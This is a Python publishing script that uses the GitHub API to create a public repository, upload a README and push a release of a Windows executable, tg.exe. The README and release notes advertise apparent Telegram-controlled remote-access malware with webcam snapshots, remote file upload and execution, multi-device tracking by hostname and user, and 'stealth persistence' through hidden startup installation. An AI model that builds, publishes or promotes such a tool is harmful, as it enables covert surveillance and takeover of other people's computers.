import requests
import base64
import os
import json
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("GH_TOKEN")
USER  = "ItzRealRxa"
REPO  = "PRxa-Remote"
EXE   = r"C:\Users\ASUS\Desktop\My Project\screen live\dist\tg.exe"

headers = {
    "Authorization": f"token {TOKEN}",
    "Accept": "application/vnd.github+json"
}

README = """<div align="center">

<img src="https://readme-typing-svg.demolab.com?font=Outfit&weight=700&size=32&pause=1000&color=FF4D4D&center=true&vCenter=true&width=600&lines=P.Rxa+Remote+Viewer;P.Rxa+Remote+Control;Master+Control+Panel" alt="Typing SVG" />

<br/>

![GitHub release](https://img.shields.io/github/v/release/ItzRealRxa/PRxa-Remote?color=ff4d4d&style=for-the-badge&logo=github)
![Downloads](https://img.shields.io/github/downloads/ItzRealRxa/PRxa-Remote/total?color=007bff&style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=for-the-badge&logo=windows)
![Bot](https://img.shields.io/badge/Telegram-Bot-26A5E4?style=for-the-badge&logo=telegram)

<br/>

> **🖥️ Full remote control of your Windows PC via Telegram & Browser Dashboard**

</div>

---

## ⬇️ Download

```
https://github.com/ItzRealRxa/PRxa-Remote/releases/download/v5/tg.exe
```

**[🔴 Click Here to Download tg.exe](https://github.com/ItzRealRxa/PRxa-Remote/releases/download/v5/tg.exe)**

> Double-click `tg.exe` — no installation needed.

---

## ✨ Features

| Category | Controls |
|---|---|
| 🖥️ **Privacy Shield** | Monitor Off/On toggle |
| 🔒 **Security** | Lock, Sleep, Shutdown |
| 📷 **Webcam** | Instant live webcam snapshot |
| 📁 **Persistence** | Auto AppData install & startup |
| 🎯 **Mouse** | Click, Right-click, Center, Scroll |
| ⌨️ **Keyboard** | Type text, Alt+Tab, Escape, Enter |
| 🎵 **Media** | Play/Pause, Next, Prev, Volume |
| 🌐 **Browser** | Open URL, Launch Chrome/YouTube |
| 🖼️ **Desktop** | Change Wallpaper, Show Desktop, Toggle Icons |
| 📊 **System Stats** | Live CPU, RAM, Battery overlay |
| 📷 **Screenshot** | Send to Telegram instantly |
| ♻️ **Auto-Relink** | Dynamic Cloudflare tunnel |

---

## 🤖 Telegram Bot Commands

| Command | Description |
|---|---|
| `/start` | Show bot info & current stream link |
| `/live` | Get stream link as web app button |
| `/relink` | Refresh the global stream link |
| `/startup` | Enable auto-start on Windows boot |
| `/upload` | Upload a file to PC Downloads |
| `/exec` | Download the remote control exe |
| `/cmd` | Download via direct link |
| `/webcam` | Take a snapshot from PC webcam |

---

## 🚀 How to Use

1. **Download** `tg.exe` from the link above
2. **Run** it — the bot starts automatically
3. **Open Telegram** → send `/live` to your bot
4. **Tap the button** to open the live stream
5. **Click ⚙️** on the stream to open the P.Rxa Remote Control Panel

---

<div align="center">

Made with ❤️ by **ItzRealRxa**

</div>
"""

print("=" * 50)
print("P.Rxa GitHub Publisher")
print("=" * 50)

# 1. Create Repository
print("\n[1/4] Creating repository...")
r = requests.post("https://api.github.com/user/repos", headers=headers, json={
    "name": REPO,
    "description": "P.Rxa Remote Viewer - P.Rxa Windows Remote Control via Telegram",
    "private": False,
    "auto_init": False
})
if r.status_code == 201:
    print(f"     [OK] Repo created: https://github.com/{USER}/{REPO}")
elif r.status_code == 422:
    print(f"     [INFO] Repo already exists, continuing...")
else:
    print(f"     [ERROR] Error: {r.status_code} - {r.text}")

# 2. Push README
print("\n[2/4] Uploading README.md...")
content_b64 = base64.b64encode(README.encode()).decode()
r = requests.put(
    f"https://api.github.com/repos/{USER}/{REPO}/contents/README.md",
    headers=headers,
    json={"message": "Add README", "content": content_b64}
)
if r.status_code in (200, 201):
    print("     [OK] README.md uploaded!")
else:
    # Try to update if it already exists
    get_r = requests.get(f"https://api.github.com/repos/{USER}/{REPO}/contents/README.md", headers=headers)
    if get_r.status_code == 200:
        sha = get_r.json()["sha"]
        r2 = requests.put(
            f"https://api.github.com/repos/{USER}/{REPO}/contents/README.md",
            headers=headers,
            json={"message": "Update README", "content": content_b64, "sha": sha}
        )
        print("     [OK] README.md updated!" if r2.status_code in (200,201) else f"     [ERROR] {r2.text}")
    else:
        print(f"     [ERROR] Error: {r.status_code}")

# 3. Create Release
print("\n[3/4] Creating release v5...")
r = requests.post(
    f"https://api.github.com/repos/{USER}/{REPO}/releases",
    headers=headers,
    json={
        "tag_name": "v5",
        "name": "P.Rxa Remote Viewer v5",
        "body": "## P.Rxa Remote Viewer v5\n\nElite remote control for Windows via Telegram.\n\n### What's New in v5:\n- 🖥️ **Identify Multi-Device by Name & User:** Commands and online status now display system hostname and Windows user name so you can track which device is running.\n- 📱 **Multi-Device Stream Switcher:** Seamlessly select and switch between online streams in the Web control panel.\n- 📷 **Webcam Snapshot:** Instantly snap webcam images remotely.\n- 📁 **Stealth persistence:** Hidden background startup installation.\n\n### Download\nRun `tg.exe` — no installation required.",
        "draft": False,
        "prerelease": False
    }
)
if r.status_code == 201:
    release_id = r.json()["id"]
    upload_url = r.json()["upload_url"].replace("{?name,label}", "")
    print(f"     [OK] Release created! ID: {release_id}")
elif r.status_code == 422:
    print("     [INFO] Release exists, fetching ID...")
    r2 = requests.get(f"https://api.github.com/repos/{USER}/{REPO}/releases/tags/v5", headers=headers)
    release_id = r2.json()["id"]
    upload_url = r2.json()["upload_url"].replace("{?name,label}", "")
    print(f"     [OK] Got release ID: {release_id}")
else:
    print(f"     [ERROR] Error: {r.status_code} - {r.text}")
    exit()

# 4. Upload tg.exe
print("\n[4/4] Uploading tg.exe...")
if not os.path.exists(EXE):
    print(f"     [ERROR] File not found: {EXE}")
    exit()

size_mb = os.path.getsize(EXE) / 1024 / 1024
print(f"     [INFO] File size: {size_mb:.1f} MB")

# Check for existing tg.exe in release assets and delete it
print("     [INFO] Checking for existing tg.exe asset...")
r_assets = requests.get(
    f"https://api.github.com/repos/{USER}/{REPO}/releases/{release_id}/assets",
    headers=headers
)
if r_assets.status_code == 200:
    for asset in r_assets.json():
        if asset["name"] == "tg.exe":
            asset_id = asset["id"]
            print(f"     [INFO] Found existing tg.exe asset (ID: {asset_id}). Deleting...")
            del_r = requests.delete(
                f"https://api.github.com/repos/{USER}/{REPO}/releases/assets/{asset_id}",
                headers=headers
            )
            if del_r.status_code == 204:
                print("     [OK] Old asset deleted successfully.")
            else:
                print(f"     [WARNING] Could not delete old asset: {del_r.status_code} - {del_r.text}")
else:
    print(f"     [WARNING] Could not retrieve release assets: {r_assets.status_code}")

with open(EXE, "rb") as f:
    data = f.read()

upload_headers = {**headers, "Content-Type": "application/octet-stream"}
r = requests.post(
    f"{upload_url}?name=tg.exe",
    headers=upload_headers,
    data=data
)
if r.status_code == 201:
    download_url = r.json()["browser_download_url"]
    print(f"     [OK] tg.exe uploaded!")
    print("\n" + "=" * 50)
    print("ALL DONE!")
    print("=" * 50)
    print(f"\n[INFO] Download URL:")
    print(f"   {download_url}")
    print(f"\n[INFO] Repository:")
    print(f"   https://github.com/{USER}/{REPO}")
    print(f"\n[INFO] Releases page:")
    print(f"   https://github.com/{USER}/{REPO}/releases")
else:
    print(f"     [ERROR] Upload failed: {r.status_code} - {r.text[:300]}")
